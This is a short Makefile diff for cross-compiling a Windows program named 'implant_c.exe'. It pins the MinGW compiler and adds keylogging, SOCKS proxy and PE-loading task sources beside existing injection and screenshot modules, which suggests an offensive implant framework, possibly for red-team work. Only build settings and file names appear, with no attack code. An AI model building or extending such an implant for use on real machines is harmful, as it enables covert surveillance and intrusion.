@@ -1,4 +1,5 @@
-CC       ?= x86_64-w64-mingw32-gcc
+# Always cross-compile; host cc cannot build Windows targets.
+CC       = x86_64-w64-mingw32-gcc
 BUILD_DIR = ../build
 OUT       = $(BUILD_DIR)/implant_c.exe
 
@@ -45,6 +46,9 @@ SRCS = \
 	src/tasks/network.c \
 	src/tasks/inject.c \
 	src/tasks/screenshot.c \
+	src/tasks/keylog.c \
+	src/tasks/socks.c \
+	src/tasks/peload.c \
 	src/tasks/stubs.c \
 	src/tasks/executor.c \
 	windows/main.c
